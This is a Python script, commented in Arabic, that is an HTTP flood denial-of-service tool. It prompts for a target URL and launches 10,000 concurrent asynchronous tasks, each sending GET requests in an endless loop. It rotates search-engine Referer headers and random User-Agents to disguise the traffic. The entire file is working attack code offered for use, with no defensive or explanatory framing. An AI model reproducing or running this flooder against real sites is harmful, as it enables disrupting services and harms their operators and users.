import aiohttp
import asyncio
from colorama import Fore, Style
import random

# متغير لتتبع حالة إيقاف الهجوم
stop_attack_flag = False

# قائمة برؤوس HTTP مختلفة
USER_AGENTS = [
    # ... (قائمة User-Agent هنا)
]

REFERERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://www.yahoo.com/",
    "https://www.duckduckgo.com/",
]

def get_random_headers():
    """إرجاع رؤوس HTTP عشوائية."""
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Referer": random.choice(REFERERS),
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
    }

async def send_requests_aiohttp(target):
    connector = aiohttp.TCPConnector(limit=100)  # تحديد الحد الأقصى لعدد الاتصالات
    async with aiohttp.ClientSession(connector=connector) as session:
        while not stop_attack_flag:
            try:
                headers = get_random_headers()
                async with session.get(target, headers=headers, timeout=5) as response:
                    await response.text()
            except aiohttp.ClientError as e:
                print(Fore.RED + f"Error in aiohttp request: {e}" + Style.RESET_ALL)
            except Exception as e:
                print(Fore.RED + f"Unexpected error in aiohttp: {e}" + Style.RESET_ALL)

def start_attack():
    global stop_attack_flag
    try:
        target = input("Target URL: ")
        print("Attack will continue indefinitely. Type 'stop' to end it.")
        execute_attack(target)
    except Exception as e:
        print(Fore.RED + f"Error: {str(e)}" + Style.RESET_ALL)

def execute_attack(target):
    global stop_attack_flag

    print(f"Starting continuous attack on {target}...")

    try:
        # استخدام asyncio للبرمجة غير المتزامنة
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        tasks = [send_requests_aiohttp(target) for _ in range(10000)]  # تقليل عدد المهام
        loop.run_until_complete(asyncio.gather(*tasks))

        print(Fore.YELLOW + "Attack in progress... Press Ctrl+C to stop." + Style.RESET_ALL)

    except KeyboardInterrupt:
        stop_attack_flag = True
        print(Fore.RED + "Attack stopped." + Style.RESET_ALL)

    except Exception as e:
        print(Fore.RED + f"Error during attack: {str(e)}" + Style.RESET_ALL)

def main():
    try:
        start_attack()
    except Exception as e:
        print(Fore.RED + f"Error: {str(e)}" + Style.RESET_ALL)

if __name__ == "__main__":
    main()
